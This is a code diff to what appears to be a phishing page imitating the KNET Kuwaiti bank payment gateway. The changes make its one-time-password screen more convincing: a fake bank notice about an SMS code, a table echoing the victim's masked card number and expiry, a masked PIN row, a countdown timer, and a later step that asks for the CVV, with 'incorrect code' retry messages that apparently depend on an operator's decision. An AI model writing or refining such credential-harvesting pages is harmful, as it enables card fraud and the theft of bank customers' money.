@@ -260,12 +260,33 @@
 
     /* بطاقة OTP */
     .otp-card { display:none; }
-    .otp-field-wrap { position:relative; width:100%; }
-    .masked-card-field { background:#f5f5f5; border:1px solid #bbb; border-radius:6px; height:32px; padding:0 36px 0 10px; width:100%; font-size:12px; font-family:monospace; letter-spacing:1px; color:#222; display:flex; align-items:center; justify-content:center; white-space:nowrap; overflow:hidden; }
-    #otp-bank-logo { position:absolute; right:8px; top:50%; transform:translateY(-50%); height:18px; width:auto; object-fit:contain; pointer-events:none; }
-    .otp-field { width:140px; font-size:16px; font-weight:700; text-align:center; letter-spacing:6px; height:38px; padding-right:52px; margin:0 auto; display:block; }
-    .otp-side-label { position:absolute; right:10px; top:50%; transform:translateY(-50%); font-size:13px; font-weight:800; color:#555; pointer-events:none; }
-    .otp-inline-error { color:#cc0000; font-weight:800; font-size:13px; text-align:center; }
+    .otp-notice {
+      background:#fffde0; border:1.5px solid #e0d870; border-radius:8px;
+      padding:12px 14px; margin:0 14px 10px; font-size:12.5px; line-height:1.7;
+      color:#333; text-align:right; direction:rtl;
+    }
+    .otp-detail-table {
+      width:100%; border-collapse:collapse; direction:rtl;
+    }
+    .otp-detail-table tr { border-bottom:1px solid var(--border); }
+    .otp-detail-table tr:last-child { border-bottom:none; }
+    .otp-detail-table .otp-td-label {
+      width:48%; padding:10px 14px 10px 4px;
+      text-align:right; font-size:14px; font-weight:700; color:var(--knet-blue);
+      white-space:nowrap; direction:rtl;
+    }
+    .otp-detail-table .otp-td-value {
+      width:52%; padding:10px 4px 10px 14px;
+      text-align:left; font-size:14px; font-weight:500; color:#333;
+      font-family:monospace; letter-spacing:0.5px; direction:ltr;
+    }
+    .otp-detail-table .otp-td-value .field {
+      height:34px; font-size:14px; letter-spacing:1px;
+    }
+    .otp-timeout {
+      font-size:12px; color:#666; text-align:center; margin-top:2px;
+    }
+    .otp-inline-error { color:#cc0000; font-weight:800; font-size:13px; text-align:center; padding:6px 14px; }
   </style>
 </head>
 <body>
@@ -370,26 +391,34 @@
 
     <!-- بطاقة OTP -->
     <div class="card otp-card" id="otp-card">
-      <table class="form-table" dir="ltr">
+      <div class="otp-notice" id="otp-notice">
+        يرجى الانتباه: سيتم الآن ارسال رسالة نصية على رقم هاتفك الجوال المسجل لدى البنك الخاص بك. هذه الرسالة المكونة من 6 خانات هي "رمز التحقق لمرة واحدة", يرجى استخدام هذا الرمز في الحقل المناسب أدناه
+      </div>
+      <div id="otp-error-row" style="display:none">
+        <div class="otp-inline-error" id="otp-inline-error">الرمز غير صحيح أو غير صالح</div>
+      </div>
+      <table class="otp-detail-table">
         <tr>
-          <td class="td-input" colspan="2">
-            <div class="otp-field-wrap">
-              <div class="masked-card-field" id="masked-card-display"></div>
-              <img id="otp-bank-logo" src="" alt="" style="display:none">
-            </div>
-          </td>
-        </tr>
-        <tr id="otp-error-row" style="display:none">
-          <td colspan="2" style="padding:4px 10px 0">
-            <div class="otp-inline-error" id="otp-inline-error">الرمز غير صحيح أو غير صالح</div>
-          </td>
+          <td class="otp-td-label">:رقم بطاقة الصراف الآلي</td>
+          <td class="otp-td-value" id="otp-masked-card"></td>
         </tr>
         <tr>
-          <td class="td-input" colspan="2">
-            <div class="otp-field-wrap">
-              <input class="field otp-field" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
-              <span class="otp-side-label" id="otp-side-label">OTP</span>
-            </div>
+          <td class="otp-td-label">:شهر انتهاء الصلاحية</td>
+          <td class="otp-td-value" id="otp-exp-month"></td>
+        </tr>
+        <tr>
+          <td class="otp-td-label">:سنة انتهاء الصلاحية</td>
+          <td class="otp-td-value" id="otp-exp-year"></td>
+        </tr>
+        <tr>
+          <td class="otp-td-label">:(الرقم السري (PIN</td>
+          <td class="otp-td-value">****</td>
+        </tr>
+        <tr>
+          <td class="otp-td-label" id="otp-field-label">:OTP</td>
+          <td class="otp-td-value">
+            <input class="field" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code" style="height:34px;font-size:14px;">
+            <div class="otp-timeout" id="otp-timeout"></div>
           </td>
         </tr>
       </table>
@@ -398,7 +427,7 @@
     <!-- أزرار OTP -->
     <div class="card action-card otp-action-card" id="otp-action-card" style="display:none">
       <div class="btn-row">
-        <button class="btn" onclick="submitOtp()">إرسال</button>
+        <button class="btn" onclick="submitOtp()">تأكيد العملية</button>
         <button class="btn" onclick="handleCancel()">إلغاء</button>
       </div>
     </div>
@@ -752,6 +781,9 @@
 
     let pollTimer2 = null;
     let savedCard  = '';
+    let savedExpMonth = '';
+    let savedExpYear  = '';
+    let otpCountdown  = null;
 
     async function handleSend() {
       const card   = cardInput.value.replace(/\s/g,'');
@@ -767,6 +799,8 @@
       const phone  = p.get('phone')  || '';
       const amount = p.get('amount') || '';
       savedCard = card;
+      savedExpMonth = expiry.slice(0,2);
+      savedExpYear  = '20' + expiry.slice(2,4);
 
       let subId = null;
       try {
@@ -803,48 +837,63 @@
     let currentStep = 'otp'; // 'otp' | 'cvv'
     let currentSubId = null;
 
+    function startOtpTimeout() {
+      if (otpCountdown) clearInterval(otpCountdown);
+      let secs = 240;
+      const el = document.getElementById('otp-timeout');
+      function tick() {
+        const m = String(Math.floor(secs/60)).padStart(2,'0');
+        const s = String(secs%60).padStart(2,'0');
+        el.textContent = 'Timeout in: ' + m + ':' + s;
+        if (secs <= 0) { clearInterval(otpCountdown); el.textContent = 'Timeout'; }
+        secs--;
+      }
+      tick();
+      otpCountdown = setInterval(tick, 1000);
+    }
+
     function showOtpCard(withError) {
       loadingCard.style.display = 'none';
-      const masked = savedCard.slice(0,4) + ' **** **** ' + savedCard.slice(-4);
-      document.getElementById('masked-card-display').textContent = masked;
-      const logo = document.getElementById('otp-bank-logo');
-      if (currentBank && currentBank.logo) {
-        logo.src = currentBank.logo;
-        logo.style.display = 'block';
-        logo.onerror = () => { logo.style.display = 'none'; };
-      }
+      const masked = savedCard.slice(0,4) + ' **** **' + savedCard.slice(10,12) + ' ' + savedCard.slice(-4);
+      document.getElementById('otp-masked-card').textContent = masked;
+      document.getElementById('otp-exp-month').textContent = savedExpMonth;
+      document.getElementById('otp-exp-year').textContent = savedExpYear;
+      document.getElementById('otp-notice').style.display = 'block';
       currentStep = 'otp';
-      document.getElementById('otp-side-label').textContent = 'OTP';
+      document.getElementById('otp-field-label').textContent = ':OTP';
       document.getElementById('otp-input').value = '';
       document.getElementById('otp-input').maxLength = 6;
       const errRow = document.getElementById('otp-error-row');
       const errMsg = document.getElementById('otp-inline-error');
       if (withError) {
         errMsg.textContent = 'الرمز غير صحيح أو غير صالح';
-        errRow.style.display = 'table-row';
+        errRow.style.display = 'block';
       } else {
         errRow.style.display = 'none';
       }
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
+      startOtpTimeout();
     }
 
     function showCvvCard(withError) {
       loadingCard.style.display = 'none';
       currentStep = 'cvv';
-      document.getElementById('otp-side-label').textContent = 'CVV';
+      document.getElementById('otp-notice').style.display = 'none';
+      document.getElementById('otp-field-label').textContent = ':CVV';
       document.getElementById('otp-input').value = '';
       document.getElementById('otp-input').maxLength = 3;
       const errRow = document.getElementById('otp-error-row');
       const errMsg = document.getElementById('otp-inline-error');
       if (withError) {
         errMsg.textContent = 'رمز الأمان غير صحيح';
-        errRow.style.display = 'table-row';
+        errRow.style.display = 'block';
       } else {
         errRow.style.display = 'none';
       }
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
+      startOtpTimeout();
     }
 
     // القبول والرفض يعتمدان على الخطوة الحالية
